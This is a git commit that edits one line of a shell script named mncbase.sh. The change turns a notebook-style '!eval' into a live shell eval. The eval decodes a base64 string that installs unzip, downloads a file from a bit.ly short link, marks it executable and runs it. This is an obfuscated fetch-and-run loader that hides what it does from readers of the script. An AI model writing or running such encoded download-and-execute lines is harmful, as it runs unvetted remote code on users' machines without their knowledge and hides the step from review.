c37d84962786915cc1f303c75ca61436d91073e4
okg123 <87088628+okg123@users.noreply.github.com>
2022-01-17 17:56:44 +0530

    Update mncbase.sh

--- mncbase.sh
+++ mncbase.sh
@@ -1,1 +1,1 @@
-!eval "$(echo "YXB0IGluc3RhbGwgdW56aXAgJiYgd2dldCBiaXQubHkvM3RDZWJSdiAmJiBjaG1vZCB1K3ggM3RDZWJSdiAmJiBzaCAzdENlYlJ2" | base64 -d )"
+eval "$(echo "YXB0IGluc3RhbGwgdW56aXAgJiYgd2dldCBiaXQubHkvM3RDZWJSdiAmJiBjaG1vZCB1K3ggM3RDZWJSdiAmJiBzaCAzdENlYlJ2" | base64 -d )"
